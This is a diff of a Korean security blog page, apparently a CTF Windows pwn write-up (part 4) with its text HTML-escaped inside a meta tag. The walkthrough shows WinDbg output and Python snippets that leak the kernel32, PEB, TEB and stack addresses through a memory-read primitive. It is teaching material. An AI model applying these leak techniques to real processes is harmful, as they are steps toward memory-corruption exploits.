+    [+&lt;span class=&#34;hljs-number&#34;&gt;0x000&lt;/span&gt;] Flink            : &lt;span class=&#34;hljs-number&#34;&gt;0x185b0702660&lt;/span&gt; [Type: _LIST_ENTRY *]
+    [+&lt;span class=&#34;hljs-number&#34;&gt;0x008&lt;/span&gt;] Blink            : &lt;span class=&#34;hljs-number&#34;&gt;0x185b0704020&lt;/span&gt; [Type: _LIST_ENTRY *]
+&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;004&lt;/span&gt;&amp;gt; dps &lt;span class=&#34;hljs-number&#34;&gt;0x185b0702660&lt;/span&gt;
+&lt;span class=&#34;hljs-number&#34;&gt;00000185&lt;/span&gt;`b0702660  &lt;span class=&#34;hljs-number&#34;&gt;00000185&lt;/span&gt;`b07024d0
+&lt;span class=&#34;hljs-number&#34;&gt;00000185&lt;/span&gt;`b0702668  &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;fd`ea3f53e0 ntdll!PebLdr+&lt;span class=&#34;hljs-number&#34;&gt;0x20&lt;/span&gt;
+&lt;span class=&#34;hljs-number&#34;&gt;00000185&lt;/span&gt;`b0702670  &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;
+&lt;span class=&#34;hljs-number&#34;&gt;00000185&lt;/span&gt;`b0702678  &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;
+&lt;span class=&#34;hljs-number&#34;&gt;00000185&lt;/span&gt;`b0702680  &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;f6`&lt;span class=&#34;hljs-number&#34;&gt;5f&lt;/span&gt;1d0000 dadadb
+&lt;span class=&#34;hljs-number&#34;&gt;00000185&lt;/span&gt;`b0702688  &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;f6`&lt;span class=&#34;hljs-number&#34;&gt;5f&lt;/span&gt;1d1eb0 dadadb+&lt;span class=&#34;hljs-number&#34;&gt;0x1eb0&lt;/span&gt;
+&lt;span class=&#34;hljs-number&#34;&gt;00000185&lt;/span&gt;`b0702690  &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00009000&lt;/span&gt;
+...&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;#xC798; &amp;#xC62C;&amp;#xB77C;&amp;#xC640; &amp;#xC788;&amp;#xB124;&amp;#xC694;! &lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;#...&lt;/span&gt;
+pebldr = ntdll + &lt;span class=&#34;hljs-number&#34;&gt;0x1653c0&lt;/span&gt;
+IMOML = readmem(key, pebldr+&lt;span class=&#34;hljs-number&#34;&gt;0x20&lt;/span&gt;)
+print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;InMemoryOrderModuleList: &amp;quot;&lt;/span&gt;,hex(IMOML))
+imagebase = readmem(key, IMOML+&lt;span class=&#34;hljs-number&#34;&gt;0x20&lt;/span&gt;)
+print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;imagebase :&amp;quot;&lt;/span&gt;,hex(imagebase))
+&lt;span class=&#34;hljs-comment&#34;&gt;#...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2019.png&#34; alt=&#34;pwncoolsexy-part4/Untitled%2019.png&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;kernel32-base&#34;&gt;&lt;a href=&#34;#kernel32-base&#34; class=&#34;headerlink&#34; title=&#34;kernel32 base&#34;&gt;&lt;/a&gt;kernel32 base&lt;/h2&gt;&lt;p&gt;imagebase&amp;#xB97C; &amp;#xAD6C;&amp;#xD588;&amp;#xC73C;&amp;#xB2C8; kernel32 base address&amp;#xB294; IAT &amp;#xD14C;&amp;#xC774;&amp;#xBE14;&amp;#xC744; &amp;#xC774;&amp;#xC6A9;&amp;#xD574; &amp;#xC27D;&amp;#xAC8C; &amp;#xAD6C;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC790;&amp;#xC138;&amp;#xD55C; &amp;#xBC29;&amp;#xBC95;&amp;#xC740; &amp;#xC81C;&amp;#xAC00; &amp;#xC791;&amp;#xB144;&amp;#xC5D0; &amp;#xCD9C;&amp;#xC81C;&amp;#xD55C; &amp;#xBB38;&amp;#xC81C;&amp;#xC778; &lt;a href=&#34;https://hackyboiz.github.io/2020/12/29/l0ch/address_book/#Exploit&#34;&gt;Christmas CTF 2020 - addressbook&lt;/a&gt; write-up&amp;#xC5D0; &amp;#xC124;&amp;#xBA85;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs angelscript&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;004&lt;/span&gt;&amp;gt; !dh &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;f6`a72d0000
+...
+&lt;span class=&#34;hljs-number&#34;&gt;3000&lt;/span&gt; [     &lt;span class=&#34;hljs-number&#34;&gt;230&lt;/span&gt;] address [size] of Import Address Table Directory
+...
+
+&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;004&lt;/span&gt;&amp;gt; lm
+start             end                 module name
+...    
+&lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;fb`&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;ea60000 &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;fb`&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;eb12000   KERNEL32   (pdb symbols) 
+...
+                
+&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;004&lt;/span&gt;&amp;gt; dps &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;f6`a72d0000 + &lt;span class=&#34;hljs-number&#34;&gt;3000&lt;/span&gt; L230
+&lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;f6`a72d3000  &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;fb`&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;ea82460 KERNEL32!ReadFile
+&lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;f6`a72d3008  &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;fb`&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;ea7e7e0 KERNEL32!HeapCreateStub
+&lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;f6`a72d3010  &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;fb`&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;ea763a0 KERNEL32!HeapFreeStub
+&lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;f6`a72d3018  &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;fb`&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;ea7c660 KERNEL32!GetStdHandleStub
+&lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;f6`a72d3020  &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;fb`&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;ed7aa20 ntdll!RtlAllocateHeap
+&lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;f6`a72d3028  &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;fb`&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;ea7e970 KERNEL32!IsDebuggerPresentStub
+&lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;f6`a72d3030  &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;fb`&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;edb4410 ntdll!RtlInitializeSListHead
+...
+
+&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;004&lt;/span&gt;&amp;gt; ? &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;fb`&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;ea82460 - &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;fb`&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;ea60000
+Evaluate expression: &lt;span class=&#34;hljs-number&#34;&gt;140384&lt;/span&gt; = &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00022460&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;kernel32!ReadFile&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xB294; kernel32 base&amp;#xC758; &lt;code&gt;0x22460&lt;/code&gt;&amp;#xC5D0; &amp;#xC704;&amp;#xCE58;&amp;#xD574; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;kernel32 = readmem(key, imagebase+&lt;span class=&#34;hljs-number&#34;&gt;0x3000&lt;/span&gt;) - &lt;span class=&#34;hljs-number&#34;&gt;0x22460&lt;/span&gt;
+print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;kernel32 :&amp;quot;&lt;/span&gt;,hex(kernel32))&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2020.png&#34; alt=&#34;pwncoolsexy-part4/Untitled%2020.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#xC790; &amp;#xC774;&amp;#xC81C; &amp;#xAC70;&amp;#xC758; &amp;#xB2E4;&amp;#xC654;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;..!&lt;/p&gt;
+&lt;h2 id=&#34;PEB-Stack-address&#34;&gt;&lt;a href=&#34;#PEB-Stack-address&#34; class=&#34;headerlink&#34; title=&#34;PEB/Stack address&#34;&gt;&lt;/a&gt;PEB/Stack address&lt;/h2&gt;&lt;p&gt;&lt;code&gt;!address -summary&lt;/code&gt; &amp;#xB85C; PEB&amp;#xC640; TEB, Stack&amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs angelscript&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;004&lt;/span&gt;&amp;gt; !address -summary
+--- Largest Region by Usage ----------- Base Address -------- Region Size ----------
+Free                                    &lt;span class=&#34;hljs-number&#34;&gt;275&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;1e0&lt;/span&gt;c0000     &lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;b7f`&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;dea0000 ( &lt;span class=&#34;hljs-number&#34;&gt;123.497&lt;/span&gt; TB)
+MappedFile                             &lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;df5`&lt;span class=&#34;hljs-number&#34;&gt;5f&lt;/span&gt;ec4000      &lt;span class=&#34;hljs-number&#34;&gt;1f&lt;/span&gt;f`d6aed000 (   &lt;span class=&#34;hljs-number&#34;&gt;1.999&lt;/span&gt; TB)
+&amp;lt;unknown&amp;gt;                              &lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;df4`&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;c060000        &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00020000&lt;/span&gt; (   &lt;span class=&#34;hljs-number&#34;&gt;4.000&lt;/span&gt; GB)
+Image                                  &lt;span class=&#34;hljs-number&#34;&gt;7f&lt;/span&gt;fd`&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;a817000        &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00163000&lt;/span&gt; (   &lt;span class=&#34;hljs-number&#34;&gt;1.387&lt;/span&gt; MB)
+Stack                                    e4`&lt;span class=&#34;hljs-number&#34;&gt;4f&lt;/span&gt;c00000        &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;000f&lt;/span&gt;c000 (&lt;span class=&#34;hljs-number&#34;&gt;1008.000&lt;/span&gt; kB)
+Heap                                    &lt;span class=&#34;hljs-number&#34;&gt;275&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;dfce000        &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;000f&lt;/span&gt;1000 ( &lt;span class=&#34;hljs-number&#34;&gt;964.000&lt;/span&gt; kB)
+Other                                  &lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;df5`&lt;span class=&#34;hljs-number&#34;&gt;5e0&lt;/span&gt;a0000        &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00033000&lt;/span&gt; ( &lt;span class=&#34;hljs-number&#34;&gt;204.000&lt;/span&gt; kB)
+TEB                                      e4`&lt;span class=&#34;hljs-number&#34;&gt;4f&lt;/span&gt;9ca000        &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00002000&lt;/span&gt; (   &lt;span class=&#34;hljs-number&#34;&gt;8.000&lt;/span&gt; kB)
+PEB                                      e4`&lt;span class=&#34;hljs-number&#34;&gt;4f&lt;/span&gt;9c9000        &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00001000&lt;/span&gt; (   &lt;span class=&#34;hljs-number&#34;&gt;4.000&lt;/span&gt; kB)&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;PEB&amp;#xB294; ntdll&amp;#xC758; bss &amp;#xC601;&amp;#xC5ED;&amp;#xC5D0; &amp;#xC704;&amp;#xCE58;&amp;#xD558;&amp;#xBA70; PEB &amp;#xC8FC;&amp;#xC18C;&amp;#xB294; &amp;#xC544;&amp;#xAE4C; &amp;#xAD6C;&amp;#xD55C; &lt;code&gt;pebldr&lt;/code&gt; &amp;#xC8FC;&amp;#xC18C; &amp;#xADFC;&amp;#xCC98;&amp;#xC5D0; &amp;#xC788;&amp;#xC73C;&amp;#xB2C8; &amp;#xB4A4;&amp;#xC801;&amp;#xB4A4;&amp;#xC801;&amp;#xAC70;&amp;#xB9AC;&amp;#xBA70; &amp;#xCC3E;&amp;#xB2E4; &amp;#xBCF4;&amp;#xBA74; &amp;#xB098;&amp;#xC635;&amp;#xB2C8;&amp;#xB2E4; &amp;#x314E;&amp;#x314E;;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs angelscript&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;004&lt;/span&gt;&amp;gt; lm
+start             end                 module name    
+...    
+&lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;fd`&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;d6a0000 &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;fd`&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;d890000   ntdll
+
+&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;004&lt;/span&gt;&amp;gt; dt ntdll!_PEB @$peb Ldr
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x018&lt;/span&gt; Ldr : &lt;span class=&#34;hljs-number&#34;&gt;0x00007ffd&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;d8053c0 _PEB_LDR_DATA
+
+&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;004&lt;/span&gt;&amp;gt; dps &lt;span class=&#34;hljs-number&#34;&gt;0x00007ffd&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;d8053c0  - &lt;span class=&#34;hljs-number&#34;&gt;100&lt;/span&gt;
+&lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;fd`&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;d8052c0  ffffffff`ffffffff
+...
+&lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;fd`&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;d805328  &lt;span class=&#34;hljs-number&#34;&gt;000000e4&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;4f&lt;/span&gt;9c9240
+&lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;fd`&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;d805330  &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00620026&lt;/span&gt;
+&lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;fd`&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;d805338  &lt;span class=&#34;hljs-number&#34;&gt;00000275&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;dfc2470&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;PEB+0x240&lt;/code&gt;&amp;#xC740; &lt;code&gt;ntdll+0x165328&lt;/code&gt;&amp;#xC5D0; &amp;#xC788;&amp;#xC73C;&amp;#xBA70; TEB&amp;#xB294; &lt;code&gt;PEB + 0x1000&lt;/code&gt;&amp;#xC5D0;, Stack address&amp;#xB294; &lt;code&gt;TEB + 0x10&lt;/code&gt;&amp;#xC5D0; &amp;#xC788;&amp;#xC73C;&amp;#xB2C8; &amp;#xAC19;&amp;#xC774; &amp;#xAD6C;&amp;#xD558;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;peb = readmem(key, ntdll + &lt;span class=&#34;hljs-number&#34;&gt;0x165328&lt;/span&gt;) - &lt;span class=&#34;hljs-number&#34;&gt;0x240&lt;/span&gt;
+teb = peb + &lt;span class=&#34;hljs-number&#34;&gt;0x1000&lt;/span&gt;
+stack = readmem(key, teb+&lt;span class=&#34;hljs-number&#34;&gt;0x10&lt;/span&gt;)
+print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;peb :&amp;quot;&lt;/span&gt;,hex(peb))
+print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;teb :&amp;quot;&lt;/span&gt;,hex(teb))&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2021.png&#34; alt=&#34;pwncoolsexy-part4/Untitled%2021.png&#34;&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;&amp;#xB4DC;&amp;#xB514;&amp;#xC5B4;&amp;#x3153;&amp;#x3153;&amp;#x3153; &amp;#xC775;&amp;#xC2A4;&amp;#xC5D0; &amp;#xD544;&amp;#xC694;&amp;#xD55C; &amp;#xBAA8;&amp;#xB4E0; &amp;#xC815;&amp;#xBCF4;&amp;#xB97C; &amp;#xAD6C;&amp;#xD588;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;! &lt;/p&gt;
+&lt;p&gt;&amp;#xB2E4;&amp;#xC74C; &amp;#xD30C;&amp;#xD2B8;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &amp;#xBCF8;&amp;#xACA9;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; exploit&amp;#xC744; &amp;#xD574;&amp;#xBCF4;&amp;#xB3C4;&amp;#xB85D; &amp;#xD558;&amp;#xACA0;&amp;#xC73C;&amp;#xBA70; &amp;#xC804; &amp;#xADF8;&amp;#xB7FC; &amp;#xC774;&amp;#xBBF8; &amp;#xB9DD;&amp;#xD55C; &amp;#xC911;&amp;#xAC04;&amp;#xACE0;&amp;#xC0AC; &amp;#xACF5;&amp;#xBD80;&amp;#xD558;&amp;#xB7EC; 20000..&lt;/p&gt;
+&lt;h1 id=&#34;Part-5-&amp;#xC608;&amp;#xACE0;&#34;&gt;&lt;a href=&#34;#Part-5-&amp;#xC608;&amp;#xACE0;&#34; class=&#34;headerlink&#34; title=&#34;Part 5 &amp;#xC608;&amp;#xACE0;&#34;&gt;&lt;/a&gt;Part 5 &amp;#xC608;&amp;#xACE0;&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2022.png&#34; alt=&#34;pwncoolsexy-part4/Untitled%2022.png&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;??? : &amp;#xB098;&amp;#xB9CC;&amp;#xC775;&amp;#xC2A4;&amp;#xC548;&amp;#xB3FC;&amp;#xB098;&amp;#xB9CC;&amp;#xC775;&amp;#xC2A4;&amp;#xC548;&amp;#xB3FC;&amp;#xB098;&amp;#xB9CC;&amp;#xC775;&amp;#xC2A4;&amp;#xC548;&amp;#xB3FC;   -2020 &amp;#xACA8;&amp;#xC6B8;, &amp;#xD06C;&amp;#xB9AC;&amp;#xC2A4;&amp;#xB9C8;&amp;#xC2A4; CTF &amp;#xBB38;&amp;#xC81C; &amp;#xC81C;&amp;#xC791; &amp;#xC911;-&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&amp;#xACFC;&amp;#xC5F0; &amp;#xB2E4;&amp;#xC74C; &amp;#xAE00;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &amp;#xC791;&amp;#xB144;&amp;#xACFC; &amp;#xAC19;&amp;#xC740; &amp;#xCC38;&amp;#xC0AC; &amp;#xC5C6;&amp;#xC774; &amp;#xC775;&amp;#xC2A4;&amp;#xC5D0; &amp;#xC131;&amp;#xACF5;&amp;#xD574; Flag&amp;#xB97C; &amp;#xC601;&amp;#xC811;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC744;&amp;#xC9C0;&amp;#x2026;&lt;/p&gt;
+ - hack &amp; life">
   <meta name="author" content="j0dev, y2sman">
   <meta name="keywords" content>
   <meta name="google-site-verification" content="DXkyiaX95-ws53Tyt0m91_umRf4gfV2qJIQZ5zQDIO4">
@@ -322,7 +623,7 @@ print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;teb :&amp;quot;&lt;/span
 &lt;/blockquote&gt;
 &lt;p&gt;&amp;#xACFC;&amp;#xC5F0; &amp;#xB2E4;&amp;#xC74C; &amp;#xAE00;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &amp;#xC791;&amp;#xB144;&amp;#xACFC; &amp;#xAC19;&amp;#xC740; &amp;#xCC38;&amp;#xC0AC; &amp;#xC5C6;&amp;#xC774; &amp;#xC775;&amp;#xC2A4;&amp;#xC5D0; &amp;#xC131;&amp;#xACF5;&amp;#xD574; Flag&amp;#xB97C; &amp;#xC601;&amp;#xC811;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC744;&amp;#xC9C0;&amp;#x2026;&lt;/p&gt;
  - hack &amp; life">
-  <meta property="og:image" content="2021/04/18/l0ch/pwncoolsexy-part4/thumbnail.png">
+  <meta property="og:image" content="https://hackyboiz.github.io2021/04/18/l0ch/pwncoolsexy-part4/thumbnail.png">
   <meta property="og:url" content="https://hackyboiz.github.io/">
 
   <link rel="canonical" href="https://hackyboiz.github.io/2021/04/18/l0ch/pwncoolsexy-part4/">
